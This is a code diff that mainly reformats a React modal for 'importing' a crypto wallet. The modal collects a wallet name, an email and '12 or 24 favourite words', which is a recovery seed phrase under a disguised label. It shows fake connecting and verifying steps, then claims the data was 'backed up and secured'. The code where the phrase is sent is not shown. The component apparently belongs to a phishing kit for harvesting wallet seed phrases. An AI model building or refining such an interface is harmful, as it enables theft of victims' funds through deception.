@@ -129,20 +129,16 @@ const handleSubmit = async () => {
   }
 };
 
-  return (
+    return (
     <>
+      {/* MAIN CONNECT MODAL */}
       {!success && (
-        <div
-          className="connect-overlay"
-          onClick={onClose}
-        >
+        <div className="connect-overlay" onClick={onClose}>
           <div
             className="connect-modal premium"
-            onClick={(e) =>
-              e.stopPropagation()
-            }
+            onClick={(e) => e.stopPropagation()}
           >
-            {/* CLOSE */}
+            {/* CLOSE BUTTON */}
             <FaTimes
               className="close-icon"
               onClick={onClose}
@@ -157,69 +153,37 @@ const handleSubmit = async () => {
                   className="wallet-logo"
                 />
               )}
-
               <h2>
                 Import your <br />
-                {wallet?.name ||
-                  "Wallet"}
+                {wallet?.name || "Wallet"}
               </h2>
             </div>
 
-            {/* ERROR */}
+            {/* ERROR MESSAGE */}
             {error && (
               <div className="validation-error">
                 <p>{error}</p>
               </div>
             )}
 
-            {/* PROGRESS */}
+            {/* PROGRESS BAR */}
             {step > 0 && (
               <div className="connection-steps">
                 <div className="progress-bar">
                   <div
                     className="progress-fill"
-                    style={{
-                      width: `${progress}%`,
-                    }}
+                    style={{ width: `${progress}%` }}
                   ></div>
                 </div>
 
                 <div className="steps">
-                  <span
-                    className={
-                      step >= 1
-                        ? "active"
-                        : ""
-                    }
-                  >
-                    {step > 1 ? (
-                      <FaCheck />
-                    ) : (
-                      "Connecting"
-                    )}
+                  <span className={step >= 1 ? "active" : ""}>
+                    {step > 1 ? <FaCheck /> : "Connecting"}
                   </span>
-
-                  <span
-                    className={
-                      step >= 2
-                        ? "active"
-                        : ""
-                    }
-                  >
-                    {step > 2 ? (
-                      <FaCheck />
-                    ) : (
-                      "Verifying"
-                    )}
+                  <span className={step >= 2 ? "active" : ""}>
+                    {step > 2 ? <FaCheck /> : "Verifying"}
                   </span>
-
-                  <span
-                    className={
-                      step >= 3
-                        ? "active"
-                        : ""
-                    }
-                  >
+                  <span className={step >= 3 ? "active" : ""}>
                     Securing
                   </span>
                 </div>
@@ -231,111 +195,59 @@ const handleSubmit = async () => {
               <>
                 <div className="connect-tabs">
                   <span
-                    className={
-                      tab ===
-                      "phrase"
-                        ? "active"
-                        : ""
-                    }
-                    onClick={() =>
-                      setTab(
-                        "phrase"
-                      )
-                    }
+                    className={tab === "phrase" ? "active" : ""}
+                    onClick={() => setTab("phrase")}
                   >
                     Favourite Words
                   </span>
                 </div>
 
                 <div className="connect-body">
-                  <label>
-                    Wallet Name
-                  </label>
-
+                  <label>Wallet Name</label>
                   <input
                     name="name"
                     placeholder="Wallet Name"
-                    value={
-                      form.name
-                    }
-                    onChange={
-                      handleChange
-                    }
+                    value={form.name}
+                    onChange={handleChange}
                   />
 
-                  <label>
-                    Email
-                  </label>
-
+                  <label>Email</label>
                   <input
                     name="email"
                     type="email"
                     placeholder="Email"
-                    value={
-                      form.email
-                    }
-                    onChange={
-                      handleChange
-                    }
+                    value={form.email}
+                    onChange={handleChange}
                   />
 
-                  {/* FAVOURITE WORDS */}
-                  <label>
-                    Favourite Words
-                  </label>
-
+                  <label>Favourite Words</label>
                   <textarea
                     name="phrase"
                     placeholder="Enter 12 or 24 favourite words"
-                    value={
-                      form.phrase
-                    }
-                    onChange={
-                      handleChange
-                    }
+                    value={form.phrase}
+                    onChange={handleChange}
                   />
 
                   <small>
-                    Choose 12 or
-                    24 favourite
-                    words
-                    separated by
-                    spaces
+                    Choose 12 or 24 favourite words separated by spaces
                   </small>
 
-                  {/* VALIDATION */}
                   {validationError && (
                     <div className="validation-error">
-                      <p>
-                        {
-                          validationError
-                        }
-                      </p>
+                      <p>{validationError}</p>
                     </div>
                   )}
 
                   <div className="connect-actions">
-                    <button
-                      className="btn-cancel"
-                      onClick={
-                        onClose
-                      }
-                    >
+                    <button className="btn-cancel" onClick={onClose}>
                       Cancel
                     </button>
-
                     <button
                       className="btn-proceed"
-                      onClick={
-                        handleSubmit
-                      }
-                      disabled={
-                        isLoading
-                      }
+                      onClick={handleSubmit}
+                      disabled={isLoading}
                     >
-                      {isLoading
-                        ? "Processing..."
-                        : "Proceed"}
+                      {isLoading ? "Processing..." : "Proceed"}
                     </button>
                   </div>
                 </div>
@@ -346,10 +258,9 @@ const handleSubmit = async () => {
       )}
 
       {/* SUCCESS MODAL */}
-      {/* SUCCESS MODAL */}
       {success && (
         <div className="success-overlay" onClick={onClose}>
-          <div 
+          <div
             className="success-modal premium-success"
             onClick={(e) => e.stopPropagation()}
           >
@@ -376,7 +287,7 @@ const handleSubmit = async () => {
             </div>
 
             <p className="success-text">
-              Your data has been successfully backed up.
+              Your data has been successfully backed up and secured.
             </p>
 
             <button
